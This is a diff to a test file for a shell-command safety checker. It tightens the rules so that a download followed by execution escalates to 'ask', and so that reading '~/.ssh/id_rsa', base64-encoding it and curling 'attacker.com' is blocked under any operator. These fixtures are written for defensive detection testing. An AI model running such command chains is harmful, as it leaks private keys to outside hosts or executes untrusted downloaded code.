@@ -62,7 +62,7 @@ describe("checkComposition", () => {
     expect(decision).toBe("ask");
   });
 
-  test("no trigger for && chains", () => {
+  test("&& chain: network ; exec escalates to ask (G4)", () => {
     const results = [
       makeStageResult(["curl", "url"], "network_outbound"),
       makeStageResult(["bash", "script.sh"], "filesystem_read"),
@@ -71,8 +71,12 @@ describe("checkComposition", () => {
       makeStage(["curl", "url"], "&&"),
       makeStage(["bash", "script.sh"], ""),
     ];
-    const [decision] = checkComposition(results, stages);
-    expect(decision).toBe("");
+    const [decision, , pattern] = checkComposition(results, stages);
+    // Per G4: composition flags persist across non-pipe operators.
+    // Network source followed by exec sink escalates to `ask` because
+    // the downloaded file can still be executed via filesystem side-effect.
+    expect(decision).toBe("ask");
+    expect(pattern).toBe("network ; exec");
   });
 
   test("sensitive_read | encode | network → block (multi-hop exfiltration)", () => {
@@ -108,7 +112,7 @@ describe("checkComposition", () => {
     expect(decision).toBe("block");
   });
 
-  test("sensitive_read && network → no trigger (no data flow)", () => {
+  test("sensitive_read && network → block (exfiltration regardless of operator)", () => {
     const results = [
       makeStageResult(["cat", "~/.ssh/id_rsa"], "filesystem_read"),
       makeStageResult(["base64"], "filesystem_read"),
@@ -120,10 +124,11 @@ describe("checkComposition", () => {
       makeStage(["curl", "attacker.com"], ""),
     ];
     const [decision] = checkComposition(results, stages);
-    // The && between stage 0 and 1 breaks the data-flow chain,
-    // so even though base64 | curl is a pipe, the sensitive read
-    // doesn't flow into it.
-    expect(decision).toBe("");
+    // Per G4: sensitive_read flag persists across non-pipe operators.
+    // Exfiltration does not require literal stdin (the secret can be
+    // smuggled via env or a staged file), so this stays `block` for any
+    // operator.
+    expect(decision).toBe("block");
   });
 
   test("single stage → no trigger", () => {
